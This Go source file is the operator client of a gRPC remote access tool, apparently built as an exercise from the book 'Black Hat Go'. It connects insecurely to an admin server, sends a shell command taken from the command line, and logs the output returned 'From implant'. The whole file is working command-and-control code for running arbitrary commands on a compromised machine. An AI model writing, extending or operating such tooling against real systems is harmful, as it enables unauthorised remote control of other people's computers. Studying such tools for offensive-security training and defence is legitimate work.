package main

import (
	"context"
	"flag"
	"github.com/rainer37/go-fun/grpc-rat-black-hat-go/grpcapi"
	log "github.com/sirupsen/logrus"
	"google.golang.org/grpc"
	"os"
)

var adminAddr string

func init()  {
	flag.StringVar(&adminAddr, "adminAddr", "localhost:9000", "addr:port listens for admin server")
	flag.Parse()
}

func main()  {
	var opts []grpc.DialOption

	opts = append(opts, grpc.WithInsecure())
	conn, err := grpc.Dial(adminAddr, opts...)
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	client := grpcapi.NewAdminClient(conn)
	var cmd = new(grpcapi.Command)
	cmd.In = os.Args[1]
	ctx := context.Background()
	cmd, err = client.RunCommand(ctx, cmd)
	if err != nil {
		log.Fatalln(err)
	}
	log.Infof("From implant: %v", cmd.Out)
}